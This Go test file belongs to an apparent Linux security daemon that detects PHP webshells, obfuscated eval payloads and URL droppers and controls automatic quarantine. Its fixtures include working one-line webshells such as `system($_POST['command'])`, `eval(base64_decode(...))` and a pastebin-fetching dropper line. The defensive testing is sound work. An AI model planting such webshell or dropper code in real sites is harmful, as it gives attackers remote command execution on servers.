//go:build linux

package daemon

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"golang.org/x/sys/unix"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/checks"
	"github.com/pidginhost/csm/internal/config"
	"github.com/pidginhost/csm/internal/yara"
)

// A paused inline response must still publish both engine detections and a
// single pause notice, instead of returning early or marking files remediated.
func TestRealtimeFileResponsePauseKeepsBothDetections(t *testing.T) {
	useRealtimeRules(t, strings.ReplaceAll(strings.ReplaceAll(realtimeHighRule, "severity: high", "severity: critical"), "category: obfuscation", "category: dropper"))
	oldYARA := yara.Active()
	yara.SetActive(matchingFanotifyYARABackend{})
	t.Cleanup(func() { yara.SetActive(oldYARA) })
	root := t.TempDir()
	cfg := &config.Config{StatePath: root}
	cfg.AutoResponse.Enabled = true
	cfg.AutoResponse.QuarantineFiles = true
	cfg.AutoResponse.MaxFileActionsPerHour = 1
	ledger := map[string]any{"version": 1, "attempts": []map[string]any{{"at": time.Now(), "account": "alice", "failed": false}}}
	data, err := json.Marshal(ledger)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "file-response.json"), data, 0600); err != nil {
		t.Fatal(err)
	}
	alerts := make(chan alert.Finding, 32)
	fm := &FileMonitor{cfg: cfg, alertCh: alerts}
	payload := []byte("<?php /* EVIL_MARKER_A " + strings.Repeat("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+-", 32) + " */")
	pauses := 0
	for _, name := range []string{"a.php", "b.php"} {
		path := filepath.Join(root, name)
		if err := os.WriteFile(path, payload, 0600); err != nil {
			t.Fatal(err)
		}
		info, err := os.Stat(path)
		if err != nil {
			t.Fatal(err)
		}
		if !fm.runSignatureScanWithSize(payload, int64(len(payload)), path, ".php", "", info) {
			t.Fatal("detection lost during pause")
		}
		got := drainChecks(alerts)
		if got["signature_match_realtime"] != alert.Critical || got["yara_match_realtime"] != alert.Critical {
			t.Fatalf("paused response lost findings: %v", got)
		}
		if _, ok := got["auto_response"]; ok {
			t.Fatal("refused response claimed successful remediation")
		}
		if _, ok := got["auto_response_paused"]; ok {
			pauses++
		}
		if actual, err := os.ReadFile(path); err != nil || string(actual) != string(payload) {
			t.Fatalf("paused response changed file: %v", err)
		}
	}
	if pauses != 1 {
		t.Fatalf("pause notices=%d, want one", pauses)
	}
}

func TestRealtimeFileResponsePauseDoesNotRetryOnDelivery(t *testing.T) {
	useRealtimeRules(t, strings.ReplaceAll(strings.ReplaceAll(realtimeHighRule, "severity: high", "severity: critical"), "category: obfuscation", "category: dropper"))
	root := t.TempDir()
	cfg := &config.Config{StatePath: root}
	cfg.AutoResponse.Enabled, cfg.AutoResponse.QuarantineFiles = true, true
	lock, err := os.Create(filepath.Join(root, "file-response.lock"))
	if err != nil {
		t.Fatal(err)
	}
	defer lock.Close()
	if err = unix.Flock(int(lock.Fd()), unix.LOCK_EX|unix.LOCK_NB); err != nil {
		t.Fatal(err)
	}
	// The inline call refuses the busy lock. If alert delivery evaluates the
	// response again after the lock clears, it will hit this broken ledger
	// and publish a second pause for a detection already left for review.
	if err = os.WriteFile(filepath.Join(root, "file-response.json"), []byte("{"), 0600); err != nil {
		t.Fatal(err)
	}
	alerts := make(chan alert.Finding, 32)
	fm := &FileMonitor{cfg: cfg, alertCh: alerts}
	payload := []byte("<?php /* EVIL_MARKER_A " + strings.Repeat("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+-", 32) + " */")
	path := filepath.Join(root, "test.php")
	if err = os.WriteFile(path, payload, 0600); err != nil {
		t.Fatal(err)
	}
	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if !fm.runSignatureScanWithSize(payload, int64(len(payload)), path, ".php", "", info) {
		t.Fatal("inline refusal lost the original detection")
	}
	if err := unix.Flock(int(lock.Fd()), unix.LOCK_UN); err != nil {
		t.Fatal(err)
	}
	close(alerts)
	var findings []alert.Finding
	detected, paused := false, false
	for f := range alerts {
		findings = append(findings, f)
		detected = detected || f.Check == "signature_match_realtime"
		paused = paused || f.Check == "auto_response_paused"
	}
	if !detected || !paused {
		t.Fatalf("expected the original detection and busy notice: %+v", findings)
	}
	if actions := checks.AutoQuarantineFiles(cfg, findings); len(actions) != 0 {
		t.Fatalf("alert delivery retried a refused inline response: %+v", actions)
	}
	if got, err := os.ReadFile(path); err != nil || string(got) != string(payload) {
		t.Fatalf("refused file was changed: %v", err)
	}
}

func TestRealtimeFileResponseWindowAllowsFullFileEvaluation(t *testing.T) {
	useRealtimeRules(t, strings.ReplaceAll(strings.ReplaceAll(realtimeHighRule, "severity: high", "severity: critical"), "category: obfuscation", "category: dropper"))
	root := t.TempDir()
	cfg := &config.Config{StatePath: root}
	cfg.AutoResponse.Enabled, cfg.AutoResponse.QuarantineFiles = true, true
	if err := os.WriteFile(filepath.Join(root, "file-response.json"), []byte("{"), 0600); err != nil {
		t.Fatal(err)
	}
	window := []byte("<?php /* EVIL_MARKER_A " + strings.Repeat("a", 2048))
	content := append(append([]byte(nil), window...), []byte(strings.Repeat("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+-", 1024)+" */")...)
	path := filepath.Join(root, "sample.php")
	if err := os.WriteFile(path, content, 0600); err != nil {
		t.Fatal(err)
	}
	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	alerts := make(chan alert.Finding, 32)
	fm := &FileMonitor{cfg: cfg, alertCh: alerts}
	if !fm.runSignatureScanWithSize(window, info.Size(), path, ".php", "", info) {
		t.Fatal("window detection lost")
	}
	close(alerts)
	var findings []alert.Finding
	for f := range alerts {
		if f.Check == "auto_response_paused" {
			t.Fatal("window unexpectedly reached response budget")
		}
		if f.Check == "signature_match_realtime" {
			findings = append(findings, f)
		}
	}
	if len(findings) != 1 {
		t.Fatalf("expected original detection, got %+v", findings)
	}
	// The full file passes confidence validation and reaches the broken ledger.
	// A window-only refusal must leave this evaluation to alert delivery.
	if actions := checks.AutoQuarantineFiles(cfg, findings); len(actions) != 1 || actions[0].Check != "auto_response_paused" {
		t.Fatalf("full-file evaluation was lost: %+v", actions)
	}
	if got, err := os.ReadFile(path); err != nil || string(got) != string(content) {
		t.Fatalf("paused file was changed: %v", err)
	}
}

func TestCriticalPHPContentFindingsReachInlineFileResponse(t *testing.T) {
	for _, tc := range []struct {
		name  string
		body  string
		check string
	}{
		{
			name:  "webshell dataflow",
			body:  `<?php system($_POST['command']);`,
			check: "webshell_content_realtime",
		},
		{
			name:  "obfuscated execution",
			body:  `<?php eval(base64_decode('ZXZhbCgnJyc7'));`,
			check: "obfuscated_php_realtime",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			cfg := &config.Config{StatePath: root}
			cfg.AutoResponse.Enabled = true
			cfg.AutoResponse.QuarantineFiles = true
			if err := os.WriteFile(filepath.Join(root, "file-response.json"), []byte("{"), 0600); err != nil {
				t.Fatal(err)
			}
			path := filepath.Join(root, "payload.php")
			if err := os.WriteFile(path, []byte(tc.body), 0600); err != nil {
				t.Fatal(err)
			}
			fd := openRawFd(t, path)
			alerts := make(chan alert.Finding, 8)
			fm := &FileMonitor{cfg: cfg, alertCh: alerts}

			if !fm.checkPHPContent(fd, path, "pid=1 cmd=php") {
				t.Fatal("critical PHP content was not detected")
			}

			close(alerts)
			var detected, paused bool
			for finding := range alerts {
				switch finding.Check {
				case tc.check:
					detected = true
					if !finding.AutoFileResponseEvaluated {
						t.Error("critical finding did not reach the file-response gate")
					}
				case "auto_response_paused":
					paused = true
				}
			}
			if !detected || !paused {
				t.Fatalf("detected=%v paused=%v, want both", detected, paused)
			}
			if got, err := os.ReadFile(path); err != nil || string(got) != tc.body {
				t.Fatalf("refused response changed the file: %v", err)
			}
		})
	}
}

func TestEarlyConfirmedPHPFindingsReachInlineFileResponse(t *testing.T) {
	for _, tc := range []struct {
		name      string
		relPath   string
		wantCheck string
	}{
		{
			name:      "known webshell filename",
			relPath:   "shell.php",
			wantCheck: "webshell_realtime",
		},
		{
			name:      "PHP in uploads",
			relPath:   "site/wp-content/uploads/payload.php",
			wantCheck: "php_in_uploads_realtime",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			cfg := &config.Config{StatePath: root}
			cfg.AutoResponse.Enabled = true
			cfg.AutoResponse.QuarantineFiles = true
			if err := os.WriteFile(filepath.Join(root, "file-response.json"), []byte("{"), 0600); err != nil {
				t.Fatal(err)
			}
			path := filepath.Join(root, tc.relPath)
			if err := os.MkdirAll(filepath.Dir(path), 0700); err != nil {
				t.Fatal(err)
			}
			body := `<?php system($_POST['command']);`
			if err := os.WriteFile(path, []byte(body), 0600); err != nil {
				t.Fatal(err)
			}
			fd := openRawFd(t, path)
			alerts := make(chan alert.Finding, 8)
			fm := &FileMonitor{cfg: cfg, alertCh: alerts}

			fm.analyzeFile(fileEvent{path: path, fd: fd})

			close(alerts)
			var detected, paused bool
			for finding := range alerts {
				switch finding.Check {
				case tc.wantCheck:
					detected = true
					if !finding.AutoFileResponseEvaluated {
						t.Error("confirmed finding did not reach the file-response gate")
					}
				case "auto_response_paused":
					paused = true
				}
			}
			if !detected || !paused {
				t.Fatalf("detected=%v paused=%v, want both", detected, paused)
			}
			if got, err := os.ReadFile(path); err != nil || string(got) != body {
				t.Fatalf("refused response changed the file: %v", err)
			}
		})
	}
}

func TestPasteURLDropperStaysReviewOnly(t *testing.T) {
	root := t.TempDir()
	cfg := &config.Config{StatePath: root}
	cfg.AutoResponse.Enabled = true
	cfg.AutoResponse.QuarantineFiles = true
	if err := os.WriteFile(filepath.Join(root, "file-response.json"), []byte("{"), 0600); err != nil {
		t.Fatal(err)
	}
	body := `<?php $payload = file_get_contents('https://pastebin.com/raw/example');`
	path := filepath.Join(root, "fetch.php")
	if err := os.WriteFile(path, []byte(body), 0600); err != nil {
		t.Fatal(err)
	}
	fd := openRawFd(t, path)
	alerts := make(chan alert.Finding, 8)
	fm := &FileMonitor{cfg: cfg, alertCh: alerts}

	if !fm.checkPHPContent(fd, path, "pid=1 cmd=php") {
		t.Fatal("paste URL dropper was not detected")
	}

	close(alerts)
	var detected bool
	for finding := range alerts {
		if finding.Check == "auto_response_paused" {
			t.Fatal("URL-only dropper reached automatic quarantine")
		}
		if finding.Check == "php_dropper_realtime" {
			detected = true
			if finding.AutoFileResponseEvaluated {
				t.Fatal("URL-only dropper was marked as an automatic file response")
			}
		}
	}
	if !detected {
		t.Fatal("missing php_dropper_realtime finding")
	}
	if got, err := os.ReadFile(path); err != nil || string(got) != body {
		t.Fatalf("review-only finding changed the file: %v", err)
	}
}

func TestCommentOnlyWebshellPatternStaysReviewOnly(t *testing.T) {
	root := t.TempDir()
	cfg := &config.Config{StatePath: root}
	cfg.AutoResponse.Enabled = true
	cfg.AutoResponse.QuarantineFiles = true
	if err := os.WriteFile(filepath.Join(root, "file-response.json"), []byte("{"), 0600); err != nil {
		t.Fatal(err)
	}
	body := `<?php /** Example only: system($_POST['command']); */ function documented() { return true; }`
	path := filepath.Join(root, "documented.php")
	if err := os.WriteFile(path, []byte(body), 0600); err != nil {
		t.Fatal(err)
	}
	fd := openRawFd(t, path)
	alerts := make(chan alert.Finding, 8)
	fm := &FileMonitor{cfg: cfg, alertCh: alerts}

	if !fm.checkPHPContent(fd, path, "pid=1 cmd=php") {
		t.Fatal("comment pattern was not detected for review")
	}

	close(alerts)
	var detected bool
	for finding := range alerts {
		if finding.Check == "auto_response_paused" {
			t.Fatal("comment-only match reached automatic quarantine")
		}
		if finding.Check == "webshell_content_realtime" {
			detected = true
			if finding.AutoFileResponseEvaluated {
				t.Fatal("comment-only match was marked as an automatic file response")
			}
		}
	}
	if !detected {
		t.Fatal("missing review-only webshell finding")
	}
	if got, err := os.ReadFile(path); err != nil || string(got) != body {
		t.Fatalf("review-only finding changed the file: %v", err)
	}
}

func TestConfirmedPHPExecutionRespectsFunctionNamespaces(t *testing.T) {
	for _, tc := range []struct {
		name string
		body string
		want bool
	}{
		{
			name: "namespaced local function",
			body: `<?php namespace App; function system($value) { return $value; } system($_POST['value']);`,
		},
		{
			name: "namespaced fallback call",
			body: `<?php namespace App; system($_POST['value']);`,
		},
		{
			name: "imported function",
			body: `<?php use function Vendor\system; system($_POST['value']);`,
		},
		{
			name: "imported alias",
			body: `<?php use function Vendor\run as system; system($_POST['value']);`,
		},
		{
			name: "mixed group imported alias",
			body: `<?php use Vendor\{function helper as system}; system($_POST['value']);`,
		},
		{
			name: "explicit global builtin",
			body: `<?php namespace App; \system($_POST['value']);`,
			want: true,
		},
		{
			name: "namespaced eval language construct",
			body: `<?php namespace App; eval($_POST['value']);`,
			want: true,
		},
		{
			name: "invalid qualified eval",
			body: `<?php namespace App; \eval($_POST['value']);`,
		},
		{
			name: "explicit global namespace after named namespace",
			body: `<?php namespace Decoy {} namespace { system($_POST['value']); }`,
			want: true,
		},
		{
			name: "function import stays in its namespace block",
			body: `<?php namespace Decoy { use function Vendor\system; } namespace { system($_POST['value']); }`,
			want: true,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := confirmedPHPExecutionData([]byte(tc.body)); got != tc.want {
				t.Fatalf("confirmed execution=%v, want %v", got, tc.want)
			}
		})
	}
}

func TestUnconfirmedPHPPatternsStayReviewOnly(t *testing.T) {
	for _, tc := range []struct {
		name string
		body string
	}{
		{
			name: "request flow example",
			body: `<?php $example = 'system($_POST["command"])';`,
		},
		{
			name: "packed payload example",
			body: `<?php $example = "eval(base64_decode('QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB'))";`,
		},
		{
			name: "prefixed helper names",
			body: `<?php my_eval(base64_decode_helper($value));`,
		},
		{
			name: "unrelated same-line calls",
			body: `<?php eval($safe); $decoded = base64_decode($value);`,
		},
		{
			name: "method named eval",
			body: `<?php $object->eval(base64_decode($value));`,
		},
		{
			name: "method named assert with request input",
			body: `<?php $validator->assert($_POST['value']);`,
		},
		{
			name: "static assert with request input",
			body: `<?php Validator::assert($_POST['value']);`,
		},
		{
			name: "variable named eval",
			body: `<?php $eval(base64_decode($value));`,
		},
		{
			name: "variable named system with request input",
			body: `<?php $system($_POST['value']);`,
		},
		{
			name: "decoded variable",
			body: `<?php eval(base64_decode($licensedPayload));`,
		},
		{
			name: "incomplete packed literal",
			body: `<?php eval(base64_decode('ZXZhbCgnJyc7`,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			cfg := &config.Config{StatePath: root}
			cfg.AutoResponse.Enabled = true
			cfg.AutoResponse.QuarantineFiles = true
			if err := os.WriteFile(filepath.Join(root, "file-response.json"), []byte("{"), 0600); err != nil {
				t.Fatal(err)
			}
			path := filepath.Join(root, "example.php")
			if err := os.WriteFile(path, []byte(tc.body), 0600); err != nil {
				t.Fatal(err)
			}
			fd := openRawFd(t, path)
			alerts := make(chan alert.Finding, 8)
			fm := &FileMonitor{cfg: cfg, alertCh: alerts}

			if !fm.checkPHPContent(fd, path, "pid=1 cmd=php") {
				t.Fatal("unconfirmed pattern was not retained for review")
			}

			close(alerts)
			for finding := range alerts {
				if finding.Check == "auto_response_paused" {
					t.Fatal("unconfirmed pattern reached automatic quarantine")
				}
				if finding.AutoFileResponseEvaluated {
					t.Fatal("unconfirmed pattern was marked as an automatic file response")
				}
			}
			if got, err := os.ReadFile(path); err != nil || string(got) != tc.body {
				t.Fatalf("review-only finding changed the file: %v", err)
			}
		})
	}
}

func TestCriticalPHPContentDeduplicatesBeforeFileResponse(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "payload.php")
	body := `<?php system($_POST['command']);`
	if err := os.WriteFile(path, []byte(body), 0600); err != nil {
		t.Fatal(err)
	}
	oldResponse := inlineQuarantineConfirmedPHP
	calls := 0
	inlineQuarantineConfirmedPHP = func(_ *config.Config, finding *alert.Finding, _ string, _ []byte, _ os.FileInfo, _ int) (string, bool, *alert.Finding) {
		calls++
		finding.AutoFileResponseEvaluated = true
		return "", false, nil
	}
	t.Cleanup(func() { inlineQuarantineConfirmedPHP = oldResponse })
	alerts := make(chan alert.Finding, 8)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: alerts}

	for range 2 {
		fd := openRawFd(t, path)
		if !fm.checkPHPContent(fd, path, "pid=1 cmd=php") {
			t.Fatal("critical PHP content was not detected")
		}
	}

	if calls != 1 {
		t.Fatalf("file-response calls=%d, want one admitted path", calls)
	}
	if len(alerts) != 1 {
		t.Fatalf("published findings=%d, want one", len(alerts))
	}
}

func TestCriticalPHPContentReplantedAtSamePathGetsNewResponse(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "payload.php")
	first := `<?php system($_POST['command']);`
	if err := os.WriteFile(path, []byte(first), 0600); err != nil {
		t.Fatal(err)
	}
	oldResponse := inlineQuarantineConfirmedPHP
	calls := 0
	inlineQuarantineConfirmedPHP = func(_ *config.Config, finding *alert.Finding, _ string, _ []byte, _ os.FileInfo, _ int) (string, bool, *alert.Finding) {
		calls++
		finding.AutoFileResponseEvaluated = true
		return "", false, nil
	}
	t.Cleanup(func() { inlineQuarantineConfirmedPHP = oldResponse })
	alerts := make(chan alert.Finding, 8)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: alerts}

	fd := openRawFd(t, path)
	if !fm.checkPHPContent(fd, path, "pid=1 cmd=php") {
		t.Fatal("first payload was not detected")
	}
	replacement := path + ".new"
	second := `<?php system($_POST['payload']);`
	if err := os.WriteFile(replacement, []byte(second), 0600); err != nil {
		t.Fatal(err)
	}
	if err := os.Rename(replacement, path); err != nil {
		t.Fatal(err)
	}
	fd = openRawFd(t, path)
	if !fm.checkPHPContent(fd, path, "pid=2 cmd=php") {
		t.Fatal("replanted payload was not detected")
	}

	if calls != 2 {
		t.Fatalf("file-response calls=%d, want both file versions", calls)
	}
	if len(alerts) != 2 {
		t.Fatalf("published findings=%d, want both file versions", len(alerts))
	}
}

func TestExpiredAlertDedupAdmitsOneConcurrentCaller(t *testing.T) {
	fm := &FileMonitor{}
	now := time.Now()
	key := "webshell:/home/example/public_html/payload.php"
	fm.alertDedup.Store(key, now.Add(-alertDedupTTL))
	start := make(chan struct{})
	var admitted atomic.Int64
	var wg sync.WaitGroup
	for range 64 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			<-start
			if fm.shouldAlertAt("webshell", "/home/example/public_html/payload.php", now) {
				admitted.Add(1)
			}
		}()
	}
	close(start)
	wg.Wait()
	if got := admitted.Load(); got != 1 {
		t.Fatalf("admitted callers=%d, want one", got)
	}
}

func TestVersionedReadRejectsSameInodeRewrite(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "payload.php")
	body := []byte(`<?php system($_POST['command']);`)
	if err := os.WriteFile(path, body, 0600); err != nil {
		t.Fatal(err)
	}
	fd := openRawFd(t, path)
	original, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	calls := 0
	stat := func(fd int) os.FileInfo {
		calls++
		if calls == 2 {
			replacement := []byte(`<?php system($_POST['payload']);`)
			if len(replacement) != len(body) {
				t.Fatal("test payload sizes differ")
			}
			if err := os.WriteFile(path, replacement, 0600); err != nil {
				t.Fatal(err)
			}
			if err := os.Chtimes(path, original.ModTime(), original.ModTime()); err != nil {
				t.Fatal(err)
			}
		}
		return scannedIdentity(fd)
	}
	got, snapshot := readVersionedFromFd(fd, len(body), stat)
	if string(got) != string(body) {
		t.Fatalf("read bytes=%q, want original snapshot", got)
	}
	if snapshot != nil {
		t.Fatal("same-inode rewrite retained an automatic-response identity")
	}
}
